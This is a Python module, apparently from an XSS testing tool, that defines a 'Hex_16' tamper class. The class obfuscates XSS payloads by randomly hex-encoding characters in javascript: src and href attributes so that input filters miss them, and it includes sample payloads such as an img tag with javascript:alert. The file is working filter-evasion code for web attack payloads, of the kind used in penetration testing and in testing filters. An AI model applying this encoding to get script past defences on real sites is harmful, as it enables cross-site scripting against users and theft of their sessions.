# coding=utf-8
import re
import traceback
import random
from xss.temper.temper import Temper
from xss.setting import LIGHT_MODEL
from xss.setting import HEAVY_MODEL


class Hex_16(Temper):
    def __init__(self):
        super(Hex_16, self).__init__()
        self.keywords = super(Hex_16, self).get_keywords()
        self.payload = None

    def temper(self, payload_set, model=LIGHT_MODEL, **kw):
        """
        10进制编码 将 <img src='javascript:alert(1)'>变成
        <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
        &#39;&#88;&#83;&#83;&#39;&#41;>
        只变换html标签内部
        :param payload_set: 
        :param model: 
        :param kw: 
        :return: 
        """
        temp_payload_set = payload_set
        if not isinstance(payload_set, set):
            payload_set = set()
            payload_set.add(temp_payload_set)
        payloads = set()
        for payload in payload_set:
            self.payload = payload
            payloads.add(self.keyword_sixteenhex(payload,))
        return payloads

    def keyword_sixteenhex(self, str):
        """
        将src, href中的标签16进制化
        两种模式
        j 变成 &#x6A
        :param str: 
        :return: 
        """
        encode_str = ""
        result_str = ""
        try:
            # 正则匹配href="sssssss"
            link_content = re.findall('(?:src|href)=(".*?")', str, re.S)
            if len(link_content) != 0:
                link_content = link_content[0]
            # 正则匹配href="ssssssssssssssssssssssssssssssssss
            else:
                link_content = re.findall('(?:src|href)=(".*)', str, re.S)[0]  
        except IndexError:
            # 返回原数据
            link_content = str              
        if "javascript" in link_content:
            for char in link_content:
                # 部分编码就行
                rand = random.randint(1,800)
                if rand < 400 or char == "\"" or char == "'":
                    encode_str += char
                    continue
                encode_str += "&#{};".format(hex(ord(char)).replace("0x", "x"))
            result_str = str.replace(link_content, encode_str)
        
        return result_str

if __name__ == "__main__":
    payload = '<img src="javascript:alert(65534);">'
    
    payloads = set()
    payloads.add(payload)
    print(Hex_16().temper(payloads))
    # print (Temper().temper(payload,))
